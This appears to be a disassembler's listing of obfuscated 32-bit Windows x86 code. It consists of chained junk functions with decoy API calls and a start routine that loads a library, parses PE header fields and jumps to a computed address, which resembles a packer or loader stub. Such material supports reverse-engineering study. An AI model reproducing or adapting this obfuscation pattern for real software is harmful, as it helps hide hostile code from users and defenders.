0x004d0000:	movl	%edi, %edi	; from: 0x004d0060(MAY)
0x004d0002:	pushl	%ebp
0x004d0003:	movl	%esp, %ebp
0x004d0005:	subl	$0x50, %esp
0x004d0008:	leal	0x14(%ebx), %edi
0x004d000b:	addl	%edx, %ecx
0x004d000d:	pushl	%edi
0x004d000e:	pushl	0xe4(%edi)
0x004d0014:	pushl	%eax
0x004d0015:	pushl	0xe0(%edi)
0x004d001b:	call	0x004d0328	; targets: 0x004d0328(MAY)
0x004d003c:	movl	%edi, %edi	; from: 0x004d063a(MAY)
0x004d003e:	pushl	%ebp
0x004d003f:	movl	%esp, %ebp
0x004d0041:	subl	$0x48, %esp
0x004d0044:	leal	0x50(%ecx), %ebx
0x004d0047:	subl	%edi, %esi
0x004d0049:	pushl	$0x0
0x004d004b:	call	GetDC@user32.dll	; targets: 0xff0001c0(MAY)
0x004d0051:	pushl	%ebx
0x004d0052:	pushl	%edx
0x004d0053:	pushl	0x128(%ebx)
0x004d0059:	pushl	0x1f8(%ebx)
0x004d005f:	pushl	%esi
0x004d0060:	call	0x004d0000	; targets: 0x004d0000(MAY)
0x004d0078:	movl	%edi, %edi	; from: 0x004d04c9(MAY)
0x004d007a:	pushl	%ebp
0x004d007b:	movl	%esp, %ebp
0x004d007d:	subl	$0x60, %esp
0x004d0080:	movl	$0x4d30a4, %edx
0x004d0085:	cmpl	$0x585f, %edx
0x004d008b:	jbe	0x004d007b	; targets: 0x004d008d(MAY)
0x004d008d:	pushl	%edx	; from: 0x004d008b(MAY)
0x004d008e:	pushl	0x1e4(%edx)
0x004d0094:	pushl	%esi
0x004d0095:	call	0x004d0a1c	; targets: 0x004d0a1c(MAY)
0x004d00c8:	movl	%edi, %edi	; from: 0x004d0c2d(MAY)
0x004d00ca:	pushl	%ebp
0x004d00cb:	movl	%esp, %ebp
0x004d00cd:	subl	$0x28, %esp
0x004d00d0:	leal	-208(%edi), %ecx
0x004d00d6:	andl	%edi, -16(%ebp)
0x004d00d9:	pushl	%ecx
0x004d00da:	pushl	%edx
0x004d00db:	pushl	%edx
0x004d00dc:	pushl	0x60(%ecx)
0x004d00df:	pushl	0x164(%ecx)
0x004d00e5:	call	0x004d0990	; targets: 0x004d0990(MAY)
0x004d0110:	movl	%edi, %edi	; from: 0x004d0b22(MAY)
0x004d0112:	pushl	%ebp
0x004d0113:	movl	%esp, %ebp
0x004d0115:	subl	$0x60, %esp
0x004d0118:	leal	0x004d3120, %esi
0x004d011e:	andl	%ecx, -16(%ebp)
0x004d0121:	pushl	%esi
0x004d0122:	pushl	%ecx
0x004d0123:	pushl	0xfc(%esi)
0x004d0129:	pushl	%edi
0x004d012a:	pushl	0x64(%esi)
0x004d012d:	call	0x004d06ec	; targets: 0x004d06ec(MAY)
0x004d0158:	movl	%edi, %edi	; from: 0x004d05f8(MAY)
0x004d015a:	pushl	%ebp
0x004d015b:	movl	%esp, %ebp
0x004d015d:	subl	$0x20, %esp
0x004d0160:	movl	$0x4d31b4, %ebx
0x004d0165:	adcl	0xc(%ebx), %eax
0x004d0168:	leal	-436(%ebx), %edx
0x004d0169:	xchgl	%eax, %ebx	; from: 0x004d0177(MAY)
0x004d016a:	decl	%esp
0x004d016e:	pushl	%edx
0x004d016f:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000220(MAY)
0x004d0175:	testl	%eax, %eax
0x004d0177:	jne	0x004d0169	; targets: 0x004d0169(MAY), 0x004d0179(MAY)
0x004d0179:	pushl	%ebx	; from: 0x004d0177(MAY)
0x004d017a:	pushl	0xb4(%ebx)
0x004d0180:	pushl	0x11c(%ebx)
0x004d0186:	call	0x004d0b4c	; targets: 0x004d0b4c(MAY)
0x004d01a0:	movl	%edi, %edi	; from: 0x004d085f(MAY)
0x004d01a2:	pushl	%ebp
0x004d01a3:	movl	%esp, %ebp
0x004d01a5:	subl	$0x60, %esp
0x004d01a8:	andl	0x140(%eax), %ecx
0x004d01ae:	leal	0x11c(%eax), %ecx
0x004d01b4:	pushl	%ecx
0x004d01b5:	pushl	$0x6ac
0x004d01ba:	movl	$0x6ac, %ebx
0x004d01bf:	pushl	%ebx
0x004d01c0:	pushl	$0x40001
0x004d01c5:	movl	$0x862985b2, %esi
0x004d01ca:	pushl	0x7a239a86(%esi)
0x004d01d0:	subl	$0x2, (%esp)
0x004d01d4:	movl	$0x4d2040, %esi
0x004d01d9:	popl	(%esi)
0x004d01db:	call	LoadLibraryExW@kernel32.dll	; targets: 0xff00000e(MAY)
0x004d0238:	movl	%edi, %edi	; from: 0x004d0c7e(MAY)
0x004d023a:	pushl	%ebp
0x004d023b:	movl	%esp, %ebp
0x004d023d:	subl	$0x38, %esp
0x004d0240:	leal	0x004d303c, %edx
0x004d0246:	sbbl	%eax, -36(%edx)
0x004d0249:	pushl	%edx
0x004d024a:	movl	$0x0, %edi
0x004d024f:	pushl	%edi
0x004d0250:	call	IsWindow@user32.dll	; targets: 0xff0000a0(MAY)
0x004d0256:	popl	%edx
0x004d0257:	pushl	%edx
0x004d0258:	pushl	0x104(%edx)
0x004d025e:	pushl	0x94(%edx)
0x004d0264:	pushl	%ebx
0x004d0265:	call	0x004d0884	; targets: 0x004d0884(MAY)
0x004d0284:	movl	%edi, %edi	; from: 0x004d07b0(MAY)
0x004d0286:	pushl	%ebp
0x004d0287:	movl	%esp, %ebp
0x004d0289:	subl	$0x24, %esp
0x004d028c:	movl	$0x4d3138, %ecx
0x004d0291:	subl	%edx, %ebx
0x004d0293:	pushl	%ecx
0x004d0294:	movl	$0x0, %ebx
0x004d0299:	pushl	%ebx
0x004d029a:	call	SetLastError@kernel32.dll	; targets: 0xff000130(MAY)
0x004d02a0:	popl	%ecx
0x004d02a1:	pushl	%ecx
0x004d02a2:	pushl	0x19c(%ecx)
0x004d02a8:	pushl	%esi
0x004d02a9:	pushl	0x108(%ecx)
0x004d02af:	pushl	0x1f8(%ecx)
0x004d02b5:	call	0x004d0c98	; targets: 0x004d0c98(MAY)
0x004d02dc:	movl	%edi, %edi	; from: 0x004d08ae(MAY)
0x004d02de:	pushl	%ebp
0x004d02df:	movl	%esp, %ebp
0x004d02e1:	subl	$0x60, %esp
0x004d02e4:	movl	$0x4d3188, %edx
0x004d02e9:	adcl	-4(%edx), %esi
0x004d02ec:	pushl	%edx
0x004d02ed:	pushl	%ebx
0x004d02ee:	pushl	0x118(%edx)
0x004d02f4:	call	0x004d0bd0	; targets: 0x004d0bd0(MAY)
0x004d0328:	movl	%edi, %edi	; from: 0x004d001b(MAY)
0x004d032a:	pushl	%ebp
0x004d032b:	movl	%esp, %ebp
0x004d032d:	subl	$0x20, %esp
0x004d0330:	movl	$0x4d3088, %ebx
0x004d0335:	subl	%ecx, -8(%ebp)
0x004d0338:	pushl	$0x0
0x004d033a:	call	LocalUnlock@kernel32.dll	; targets: 0xff0000f0(MAY)
0x004d0340:	pushl	%ebx
0x004d0341:	pushl	%edx
0x004d0342:	pushl	0x2c(%ebx)
0x004d0345:	pushl	%edx
0x004d0346:	pushl	%ecx
0x004d0347:	call	0x004d03b8	; targets: 0x004d03b8(MAY)
0x004d0364:	movl	%edi, %edi	; from: 0x004d07e7(MAY)
0x004d0366:	pushl	%ebp
0x004d0367:	movl	%esp, %ebp
0x004d0369:	subl	$0x48, %esp
0x004d036c:	leal	-240(%edi), %esi
0x004d0372:	orl	-56(%esi), %eax
0x004d0375:	pushl	%esi
0x004d0376:	pushl	0x150(%esi)
0x004d037c:	pushl	0x130(%esi)
0x004d0382:	pushl	0x1bc(%esi)
0x004d0388:	call	0x004d0a68	; targets: 0x004d0a68(MAY)
0x004d03b8:	movl	%edi, %edi	; from: 0x004d0347(MAY)
0x004d03ba:	pushl	%ebp
0x004d03bb:	movl	%esp, %ebp
0x004d03bd:	subl	$0x44, %esp
0x004d03c0:	leal	0x24(%ebx), %edi
0x004d03c3:	xorl	$0xffffffc6, %edx
0x004d03c6:	movl	$0x0, %edx
0x004d03cb:	pushl	%edx
0x004d03cc:	call	GlobalFree@kernel32.dll	; targets: 0xff000030(MAY)
0x004d03d2:	pushl	%edi
0x004d03d3:	pushl	%edx
0x004d03d4:	pushl	%edx
0x004d03d5:	pushl	%edx
0x004d03d6:	call	0x004d06a4	; targets: 0x004d06a4(MAY)
0x004d03f8:	movl	%edi, %edi	; from: 0x004d0a97(MAY)
0x004d03fa:	pushl	%ebp
0x004d03fb:	movl	%esp, %ebp
0x004d03fd:	subl	$0x5c, %esp
0x004d0400:	movl	$0x4d31a4, %ebx
0x004d0405:	cmpl	$0x517e, %ebx
0x004d040b:	je	0x004d03fb	; targets: 0x004d040d(MAY)
0x004d040d:	pushl	$0x0	; from: 0x004d040b(MAY)
0x004d040f:	call	SetLastError@kernel32.dll	; targets: 0xff000130(MAY)
0x004d0415:	pushl	%ebx
0x004d0416:	pushl	0x64(%ebx)
0x004d0419:	pushl	0x108(%ebx)
0x004d041f:	pushl	0x20(%ebx)
0x004d0422:	call	0x004d0ab0	; targets: 0x004d0ab0(MAY)
0x004d043c:	movl	%edi, %edi	; from: 0x004d0bb0(MAY)
0x004d043e:	pushl	%ebp
0x004d043f:	movl	%esp, %ebp
0x004d0441:	subl	$0x44, %esp
0x004d0444:	movl	$0x4d30dc, %edi
0x004d0449:	xorl	$0xf8b, 0x74(%edi)
0x004d0450:	pushl	$0x0
0x004d0452:	call	GetDC@user32.dll	; targets: 0xff0001c0(MAY)
0x004d0458:	pushl	%edi
0x004d0459:	pushl	0x1b0(%edi)
0x004d045f:	pushl	%ebx
0x004d0460:	pushl	%ebx
0x004d0461:	pushl	0x94(%edi)
0x004d0467:	call	0x004d0620	; targets: 0x004d0620(MAY)

start:
0x004d0490:	pushl	$0x0
0x004d0492:	call	SetLastError@kernel32.dll	; targets: 0xff000130(MAY)
0x004d0498:	pushl	$0x0
0x004d049a:	call	Sleep@kernel32.dll	; targets: 0xff0000b0(MAY)
0x004d04a0:	pushl	$0x2
0x004d04a2:	xorl	%eax, %eax
0x004d04a4:	leal	0x4d3200(,%eax,2), %eax
0x004d04ab:	pushl	$0x0
0x004d04ad:	leal	0xc(%eax), %ecx
0x004d04b0:	addb	$0xffffffb0, (%ecx)
0x004d04b3:	pushl	%eax
0x004d04b4:	nop	
0x004d04b5:	call	LoadLibraryExW@kernel32.dll	; targets: 0xff000050(MAY)
0x004d04bb:	leal	0x3b(%eax), %edx
0x004d04be:	movl	(%edx), %ecx
0x004d04c0:	movl	0x28(%eax,%ecx), %eax
0x004d04c4:	movb	$0x40, %ah
0x004d04c6:	pusha	
0x004d04c7:	cmpb	%ah, %al
0x004d04c9:	ja	0x004d0078	; targets: 0x004d0078(MAY), 0x004d04cf(MAY)
0x004d04cf:	popa		; from: 0x004d04c9(MAY)
0x004d04d0:	ret	; targets: 0xfee70000(MAY)

0x004d04d8:	movl	%edi, %edi	; from: 0x004d0bef(MAY)
0x004d04da:	pushl	%ebp
0x004d04db:	movl	%esp, %ebp
0x004d04dd:	subl	$0x34, %esp
0x004d04e0:	movl	$0x4d30e8, %eax
0x004d04e5:	xorl	$0x1d, -12(%ebp)
0x004d04e9:	pushl	%eax
0x004d04ea:	pushl	0x110(%eax)
0x004d04f0:	pushl	%ecx
0x004d04f1:	call	0x004d0b00	; targets: 0x004d0b00(MAY)
0x004d0520:	movl	%edi, %edi	; from: 0x004d091d(MAY)
0x004d0522:	pushl	%ebp
0x004d0523:	movl	%esp, %ebp
0x004d0525:	subl	$0x54, %esp
0x004d0528:	leal	-320(%esi), %eax
0x004d052e:	orl	-16(%ebp), %edi
0x004d0531:	pushl	%eax
0x004d0532:	pushl	0x120(%eax)
0x004d0538:	pushl	0x5c(%eax)
0x004d053b:	pushl	%edi
0x004d053c:	call	0x004d0804	; targets: 0x004d0804(MAY)
0x004d0564:	movl	%edi, %edi	; from: 0x004d09b8(MAY)
0x004d0566:	pushl	%ebp
0x004d0567:	movl	%esp, %ebp
0x004d0569:	subl	$0x44, %esp
0x004d056c:	movl	$0x4d3010, %eax
0x004d0571:	xorl	$0xffffffce, 0x120(%eax)
0x004d0578:	pushl	%eax
0x004d0579:	call	GetFocus@user32.dll	; targets: 0xff000170(MAY)
0x004d057f:	popl	%eax
0x004d0580:	pushl	%eax
0x004d0581:	pushl	0xc(%eax)
0x004d0584:	pushl	%esi
0x004d0585:	call	0x004d08c4	; targets: 0x004d08c4(MAY)
0x004d05a0:	movl	%edi, %edi	; from: 0x004d08db(MAY)
0x004d05a2:	pushl	%ebp
0x004d05a3:	movl	%esp, %ebp
0x004d05a5:	subl	$0x24, %esp
0x004d05a8:	movl	$0x4d31ec, %eax
0x004d05ad:	adcl	%edx, %ebx
0x004d05af:	pushl	%eax
0x004d05b0:	pushl	%ebx
0x004d05b1:	pushl	%esi
0x004d05b2:	call	0x004d0948	; targets: 0x004d0948(MAY)
0x004d05d8:	movl	%edi, %edi	; from: 0x004d076b(MAY)
0x004d05da:	pushl	%ebp
0x004d05db:	movl	%esp, %ebp
0x004d05dd:	subl	$0x50, %esp
0x004d05e0:	leal	0x004d3084, %edi
0x004d05e6:	xorl	-12(%ebp), %esi
0x004d05e9:	pushl	%edi
0x004d05ea:	pushl	0x1dc(%edi)
0x004d05f0:	pushl	%ebx
0x004d05f1:	pushl	0x120(%edi)
0x004d05f7:	pushl	%esi
0x004d05f8:	call	0x004d0158	; targets: 0x004d0158(MAY)
0x004d0620:	movl	%edi, %edi	; from: 0x004d0467(MAY)
0x004d0622:	pushl	%ebp
0x004d0623:	movl	%esp, %ebp
0x004d0625:	subl	$0x48, %esp
0x004d0628:	leal	-148(%edi), %ecx
0x004d062e:	subl	$0xfffffff8, 0x12c(%ecx)
0x004d0635:	pushl	%ecx
0x004d0636:	pushl	%edi
0x004d0637:	pushl	0x28(%ecx)
0x004d063a:	call	0x004d003c	; targets: 0x004d003c(MAY)
0x004d0660:	movl	%edi, %edi	; from: 0x004d081f(MAY)
0x004d0662:	pushl	%ebp
0x004d0663:	movl	%esp, %ebp
0x004d0665:	subl	$0x48, %esp
0x004d0668:	leal	-24(%ebx), %ecx
0x004d066b:	adcl	%edx, -24(%ebp)
0x004d066e:	pushl	%ecx
0x004d066f:	movl	$0x0, %edi
0x004d0674:	pushl	%edi
0x004d0675:	call	GlobalFree@kernel32.dll	; targets: 0xff000030(MAY)
0x004d067b:	popl	%ecx
0x004d067c:	pushl	%ecx
0x004d067d:	pushl	%edi
0x004d067e:	pushl	0x188(%ecx)
0x004d0684:	pushl	0x19c(%ecx)
0x004d068a:	pushl	%esi
0x004d068b:	call	0x004d0b94	; targets: 0x004d0b94(MAY)
0x004d06a4:	movl	%edi, %edi	; from: 0x004d03d6(MAY)
0x004d06a6:	pushl	%ebp
0x004d06a7:	movl	%esp, %ebp
0x004d06a9:	subl	$0x48, %esp
0x004d06ac:	leal	0x004d3108, %ecx
0x004d06b2:	sbbl	%edi, %edx
0x004d06b4:	pushl	%ecx
0x004d06b5:	pushl	0x1fc(%ecx)
0x004d06bb:	pushl	0x118(%ecx)
0x004d06c1:	call	0x004d0c10	; targets: 0x004d0c10(MAY)
0x004d06ec:	movl	%edi, %edi	; from: 0x004d012d(MAY)
0x004d06ee:	pushl	%ebp
0x004d06ef:	movl	%esp, %ebp
0x004d06f1:	subl	$0x20, %esp
0x004d06f4:	leal	0x004d3034, %eax
0x004d06fa:	movl	-24(%ebp), %edx
0x004d06fd:	pushl	%eax
0x004d06fe:	leal	-52(%eax), %edx	; from: 0x004d070a(MAY)
0x004d0701:	pushl	%edx
0x004d0702:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000220(MAY)
0x004d0708:	testl	%eax, %eax
0x004d070a:	jne	0x004d06fe	; targets: 0x004d06fe(MAY), 0x004d070c(MAY)
0x004d070c:	popl	%eax	; from: 0x004d070a(MAY)
0x004d070d:	pushl	%eax
0x004d070e:	pushl	%ecx
0x004d070f:	pushl	%edi
0x004d0710:	pushl	0xf4(%eax)
0x004d0716:	pushl	0x1d4(%eax)
0x004d071c:	call	0x004d07c8	; targets: 0x004d07c8(MAY)
0x004d0738:	movl	%edi, %edi	; from: 0x004d0a3a(MAY)
0x004d073a:	pushl	%ebp
0x004d073b:	movl	%esp, %ebp
0x004d073d:	subl	$0x28, %esp
0x004d0740:	movl	$0x4d3084, %edx
0x004d0745:	cmpl	$0x707b, %edx
0x004d074b:	jbe	0x004d073b	; targets: 0x004d074d(MAY)
0x004d074d:	pushl	%edx	; from: 0x004d074b(MAY)
0x004d074e:	movl	$0x0, %ebx
0x004d0753:	pushl	%ebx
0x004d0754:	call	LocalUnlock@kernel32.dll	; targets: 0xff0000f0(MAY)
0x004d075a:	popl	%edx
0x004d075b:	pushl	%edx
0x004d075c:	pushl	0x84(%edx)
0x004d0762:	pushl	0xd4(%edx)
0x004d0768:	pushl	0x7c(%edx)
0x004d076b:	call	0x004d05d8	; targets: 0x004d05d8(MAY)
0x004d0784:	movl	%edi, %edi	; from: 0x004d0970(MAY)
0x004d0786:	pushl	%ebp
0x004d0787:	movl	%esp, %ebp
0x004d0789:	subl	$0x60, %esp
0x004d078c:	leal	0x004d3040, %eax
0x004d0792:	movl	$0xffffb0e1, 0x50(%eax)
0x004d0799:	pushl	%eax
0x004d079a:	pushl	$0x0
0x004d079c:	call	IsWindow@user32.dll	; targets: 0xff0000a0(MAY)
0x004d07a2:	popl	%eax
0x004d07a3:	pushl	%eax
0x004d07a4:	pushl	0x1c0(%eax)
0x004d07aa:	pushl	0x114(%eax)
0x004d07b0:	call	0x004d0284	; targets: 0x004d0284(MAY)
0x004d07c8:	movl	%edi, %edi	; from: 0x004d071c(MAY)
0x004d07ca:	pushl	%ebp
0x004d07cb:	movl	%esp, %ebp
0x004d07cd:	subl	$0x3c, %esp
0x004d07d0:	movl	$0x4d3164, %edi
0x004d07d5:	movl	-20(%ebp), %esi
0x004d07d8:	movl	$0x0, %ebx
0x004d07dd:	pushl	%ebx
0x004d07de:	call	UnmapViewOfFile@kernel32.dll	; targets: 0xff000120(MAY)
0x004d07e4:	pushl	%edi
0x004d07e5:	pushl	%ecx
0x004d07e6:	pushl	%ebx
0x004d07e7:	call	0x004d0364	; targets: 0x004d0364(MAY)
0x004d0804:	movl	%edi, %edi	; from: 0x004d053c(MAY)
0x004d0806:	pushl	%ebp
0x004d0807:	movl	%esp, %ebp
0x004d0809:	subl	$0x60, %esp
0x004d080c:	movl	$0x4d308c, %ebx
0x004d0811:	subl	%edi, 0x80(%ebx)
0x004d0817:	pushl	%ebx
0x004d0818:	pushl	%esi
0x004d0819:	pushl	0xdc(%ebx)
0x004d081f:	call	0x004d0660	; targets: 0x004d0660(MAY)
0x004d0848:	movl	%edi, %edi	; from: 0x004d0896(MAY), 0x004d0acc(MAY)
0x004d084a:	pushl	%ebp
0x004d084b:	movl	%esp, %ebp
0x004d084d:	subl	$0x50, %esp
0x004d0850:	movl	$0x4d30ac, %eax
0x004d0855:	andl	%edx, (%eax)
0x004d0857:	pushl	%eax
0x004d0858:	pushl	0xd0(%eax)
0x004d085e:	pushl	%edx
0x004d085f:	call	0x004d01a0	; targets: 0x004d01a0(MAY)
0x004d0884:	movl	%edi, %edi	; from: 0x004d0265(MAY)
0x004d0886:	pushl	%ebp
0x004d0887:	movl	%esp, %ebp
0x004d0889:	subl	$0x30, %esp
0x004d088c:	leal	0x14(%edx), %ebx
0x004d088f:	subl	$0x4b32, %edi
0x004d0895:	leal	-80(%ebx), %esi
0x004d0896:	jae	0x004d0848	; targets: 0x004d0848(MAY)	; from: 0x004d08a1(MAY)
0x004d0898:	pushl	%esi
0x004d0899:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000220(MAY)
0x004d089f:	testl	%eax, %eax
0x004d08a1:	jne	0x004d0896	; targets: 0x004d0896(MAY), 0x004d08a3(MAY)
0x004d08a3:	pushl	%ebx	; from: 0x004d08a1(MAY)
0x004d08a4:	pushl	%edi
0x004d08a5:	pushl	0x19c(%ebx)
0x004d08ab:	pushl	0x44(%ebx)
0x004d08ae:	call	0x004d02dc	; targets: 0x004d02dc(MAY)
0x004d08c4:	movl	%edi, %edi	; from: 0x004d0585(MAY)
0x004d08c6:	pushl	%ebp
0x004d08c7:	movl	%esp, %ebp
0x004d08c9:	subl	$0x58, %esp
0x004d08cc:	leal	0x68(%eax), %edx
0x004d08cf:	orl	0x74(%edx), %edi
0x004d08d2:	pushl	%edx
0x004d08d3:	pushl	0x180(%edx)
0x004d08d9:	pushl	%esi
0x004d08da:	pushl	%eax
0x004d08db:	call	0x004d05a0	; targets: 0x004d05a0(MAY)
0x004d0908:	movl	%edi, %edi	; from: 0x004d09ff(MAY)
0x004d090a:	pushl	%ebp
0x004d090b:	movl	%esp, %ebp
0x004d090d:	subl	$0x30, %esp
0x004d0910:	leal	0x004d31e4, %esi
0x004d0916:	orl	$0xffffffe4, %edi
0x004d0919:	pushl	%esi
0x004d091a:	pushl	%edx
0x004d091b:	pushl	%ebx
0x004d091c:	pushl	%ecx
0x004d091d:	call	0x004d0520	; targets: 0x004d0520(MAY)
0x004d0948:	movl	%edi, %edi	; from: 0x004d05b2(MAY)
0x004d094a:	pushl	%ebp
0x004d094b:	movl	%esp, %ebp
0x004d094d:	subl	$0x38, %esp
0x004d0950:	movl	$0x4d31f0, %edx
0x004d0955:	addl	$0xffff9184, -20(%ebp)
0x004d095c:	pushl	%edx
0x004d095d:	pushl	$0x0
0x004d095f:	call	IsWindow@user32.dll	; targets: 0xff0000a0(MAY)
0x004d0965:	popl	%edx
0x004d0966:	pushl	%edx
0x004d0967:	pushl	%eax
0x004d0968:	pushl	%eax
0x004d0969:	pushl	%eax
0x004d096a:	pushl	0x17c(%edx)
0x004d0970:	call	0x004d0784	; targets: 0x004d0784(MAY)
0x004d0990:	movl	%edi, %edi	; from: 0x004d00e5(MAY)
0x004d0992:	pushl	%ebp
0x004d0993:	movl	%esp, %ebp
0x004d0995:	subl	$0x30, %esp
0x004d0998:	movl	$0x4d3160, %edx
0x004d099d:	adcl	$0x486e, %eax
0x004d09a2:	pushl	%edx
0x004d09a3:	movl	$0x0, %ebx
0x004d09a8:	pushl	%ebx
0x004d09a9:	call	UnmapViewOfFile@kernel32.dll	; targets: 0xff000120(MAY)
0x004d09af:	popl	%edx
0x004d09b0:	pushl	%edx
0x004d09b1:	pushl	%ebx
0x004d09b2:	pushl	0x188(%edx)
0x004d09b8:	call	0x004d0564	; targets: 0x004d0564(MAY)
0x004d09d4:	movl	%edi, %edi	; from: 0x004d0b6b(MAY)
0x004d09d6:	pushl	%ebp
0x004d09d7:	movl	%esp, %ebp
0x004d09d9:	subl	$0x20, %esp
0x004d09dc:	leal	0x004d3034, %ebx
0x004d09e2:	xorl	%edx, 0x70(%ebx)
0x004d09e5:	call	GetLastError@kernel32.dll	; targets: 0xff0000d0(MAY)
0x004d09eb:	pushl	%ebx
0x004d09ec:	pushl	0x94(%ebx)
0x004d09f2:	pushl	0x1c8(%ebx)
0x004d09f8:	pushl	0x158(%ebx)
0x004d09fe:	pushl	%eax
0x004d09ff:	call	0x004d0908	; targets: 0x004d0908(MAY)
0x004d0a1c:	movl	%edi, %edi	; from: 0x004d0095(MAY)
0x004d0a1e:	pushl	%ebp
0x004d0a1f:	movl	%esp, %ebp
0x004d0a21:	subl	$0x24, %esp
0x004d0a24:	movl	$0x4d310c, %ebx
0x004d0a29:	cmpl	$0x75ab, %ebx
0x004d0a2f:	je	0x004d0a1f	; targets: 0x004d0a31(MAY)
0x004d0a31:	pushl	%ebx	; from: 0x004d0a2f(MAY)
0x004d0a32:	pushl	0x1e4(%ebx)
0x004d0a38:	pushl	%edx
0x004d0a39:	pushl	%edx
0x004d0a3a:	call	0x004d0738	; targets: 0x004d0738(MAY)
0x004d0a68:	movl	%edi, %edi	; from: 0x004d0388(MAY)
0x004d0a6a:	pushl	%ebp
0x004d0a6b:	movl	%esp, %ebp
0x004d0a6d:	subl	$0x30, %esp
0x004d0a70:	leal	0xe8(%esi), %eax
0x004d0a76:	orl	-16(%ebp), %ebx
0x004d0a79:	pushl	%eax
0x004d0a7a:	pushl	$0x0
0x004d0a7c:	call	HeapDestroy@kernel32.dll	; targets: 0xff000180(MAY)
0x004d0a82:	popl	%eax
0x004d0a83:	pushl	%eax
0x004d0a84:	pushl	%ebx
0x004d0a85:	pushl	0x18c(%eax)
0x004d0a8b:	pushl	0x178(%eax)
0x004d0a91:	pushl	0xe4(%eax)
0x004d0a97:	call	0x004d03f8	; targets: 0x004d03f8(MAY)
0x004d0ab0:	movl	%edi, %edi	; from: 0x004d0422(MAY)
0x004d0ab2:	pushl	%ebp
0x004d0ab3:	movl	%esp, %ebp
0x004d0ab5:	subl	$0x1c, %esp
0x004d0ab8:	leal	0x004d31b8, %esi
0x004d0abe:	sbbl	%esi, -136(%esi)
0x004d0ac4:	pushl	%esi
0x004d0ac5:	pushl	0x110(%esi)
0x004d0acb:	pushl	%ebx
0x004d0acc:	call	0x004d0848	; targets: 0x004d0848(MAY)
0x004d0b00:	movl	%edi, %edi	; from: 0x004d04f1(MAY)
0x004d0b02:	pushl	%ebp
0x004d0b03:	movl	%esp, %ebp
0x004d0b05:	subl	$0x54, %esp
0x004d0b08:	leal	-144(%eax), %ecx
0x004d0b0e:	addl	%edi, -88(%ecx)
0x004d0b11:	pushl	%ecx
0x004d0b12:	pushl	0x154(%ecx)
0x004d0b18:	pushl	%edx
0x004d0b19:	pushl	0x12c(%ecx)
0x004d0b1f:	pushl	0x8(%ecx)
0x004d0b22:	call	0x004d0110	; targets: 0x004d0110(MAY)
0x004d0b4c:	movl	%edi, %edi	; from: 0x004d0186(MAY)
0x004d0b4e:	pushl	%ebp
0x004d0b4f:	movl	%esp, %ebp
0x004d0b51:	subl	$0x2c, %esp
0x004d0b54:	leal	0x004d3100, %esi
0x004d0b5a:	xorl	0x48(%esi), %eax
0x004d0b5d:	pushl	%esi
0x004d0b5e:	pushl	0x170(%esi)
0x004d0b64:	pushl	%ebx
0x004d0b65:	pushl	0x1dc(%esi)
0x004d0b6b:	call	0x004d09d4	; targets: 0x004d09d4(MAY)
0x004d0b94:	movl	%edi, %edi	; from: 0x004d068b(MAY)
0x004d0b96:	pushl	%ebp
0x004d0b97:	movl	%esp, %ebp
0x004d0b99:	subl	$0x58, %esp
0x004d0b9c:	movl	$0x4d3174, %edx
0x004d0ba1:	orl	-52(%ebp), %ecx
0x004d0ba4:	pushl	%edx
0x004d0ba5:	pushl	%eax
0x004d0ba6:	pushl	%eax
0x004d0ba7:	pushl	0x40(%edx)
0x004d0baa:	pushl	0x1a4(%edx)
0x004d0bb0:	call	0x004d043c	; targets: 0x004d043c(MAY)
0x004d0bd0:	movl	%edi, %edi	; from: 0x004d02f4(MAY)
0x004d0bd2:	pushl	%ebp
0x004d0bd3:	movl	%esp, %ebp
0x004d0bd5:	subl	$0x3c, %esp
0x004d0bd8:	leal	0x004d3084, %ebx
0x004d0bde:	cmpl	$0x5f2e, %ebx
0x004d0be4:	je	0x004d0bd3	; targets: 0x004d0be6(MAY)
0x004d0be6:	pushl	%ebx	; from: 0x004d0be4(MAY)
0x004d0be7:	pushl	%esi
0x004d0be8:	pushl	%ecx
0x004d0be9:	pushl	0x1f0(%ebx)
0x004d0bef:	call	0x004d04d8	; targets: 0x004d04d8(MAY)
0x004d0c10:	movl	%edi, %edi	; from: 0x004d06c1(MAY)
0x004d0c12:	pushl	%ebp
0x004d0c13:	movl	%esp, %ebp
0x004d0c15:	subl	$0x5c, %esp
0x004d0c18:	movl	$0x4d30ec, %edi
0x004d0c1d:	addl	$0x42a2, %eax
0x004d0c22:	pushl	%edi
0x004d0c23:	pushl	%eax
0x004d0c24:	pushl	0x10(%edi)
0x004d0c27:	pushl	0x1ac(%edi)
0x004d0c2d:	call	0x004d00c8	; targets: 0x004d00c8(MAY)
0x004d0c58:	movl	%edi, %edi	; from: 0x004d0cc7(MAY)
0x004d0c5a:	pushl	%ebp
0x004d0c5b:	movl	%esp, %ebp
0x004d0c5d:	subl	$0x3c, %esp
0x004d0c60:	leal	-224(%eax), %ebx
0x004d0c66:	addl	$0x31, -204(%ebx)
0x004d0c6d:	pushl	$0x0
0x004d0c6f:	call	ReleaseMutex@kernel32.dll	; targets: 0xff000070(MAY)
0x004d0c75:	pushl	%ebx
0x004d0c76:	pushl	%edx
0x004d0c77:	pushl	0x138(%ebx)
0x004d0c7d:	pushl	%edx
0x004d0c7e:	call	0x004d0238	; targets: 0x004d0238(MAY)
0x004d0c98:	movl	%edi, %edi	; from: 0x004d02b5(MAY)
0x004d0c9a:	pushl	%ebp
0x004d0c9b:	movl	%esp, %ebp
0x004d0c9d:	subl	$0x20, %esp
0x004d0ca0:	movl	$0x4d31e8, %eax
0x004d0ca5:	cmpl	$0x35ef, %eax
0x004d0caa:	jbe	0x004d0c9b	; targets: 0x004d0cac(MAY)
0x004d0cac:	pushl	%eax	; from: 0x004d0caa(MAY)
0x004d0cad:	movl	$0x0, %edx
0x004d0cb2:	pushl	%edx
0x004d0cb3:	call	HeapDestroy@kernel32.dll	; targets: 0xff000180(MAY)
0x004d0cb9:	popl	%eax
0x004d0cba:	pushl	%eax
0x004d0cbb:	pushl	0x198(%eax)
0x004d0cc1:	pushl	0x11c(%eax)
0x004d0cc7:	call	0x004d0c58	; targets: 0x004d0c58(MAY)
